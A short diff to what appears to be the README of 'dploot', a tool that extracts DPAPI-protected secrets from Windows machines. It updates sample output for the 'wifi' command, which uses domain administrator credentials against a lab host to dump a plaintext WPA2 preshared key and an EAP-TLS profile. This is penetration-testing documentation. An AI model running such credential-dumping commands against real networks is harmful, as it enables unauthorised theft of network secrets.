@@ -629,9 +629,38 @@ $ dploot wifi -d waza.local -u Administrator -p 'Password!123' 192.168.57.5
 [*] Triage ALL WIFI profiles
 
 [WIFI]
-Name:           WFD_[...]
-AuthType:       WPA2PSK
-Pass:           StrongWifiPassMyFriend 
+SSID:		Wifi_G
+AuthType:	WPA2PSK
+Encryption:	AES
+Preshared key:	AzErTy1234567890QwSxDcFvG
+
+[WIFI]
+SSID:		EAP_TLS
+AuthType:	WPA2 EAP
+Encryption:	AES
+EAP Type:	EAP TLS
+
+EapHostConfig:
+  EapMethod:
+    Type: 13
+    VendorId: 0
+    VendorType: 0
+    AuthorId: 0
+  Config:
+    Eap:
+      Type: 13
+      EapType:
+        CredentialsSource:
+          CertificateStore:
+            SimpleCertSelection: true
+        ServerValidation:
+          DisableUserPromptForServerValidation: false
+          ServerNames: None
+        DifferentUsername: false
+        PerformServerValidation: true
+        AcceptServerName: false
+
+[snip]
 ```
 
 #### backupkey
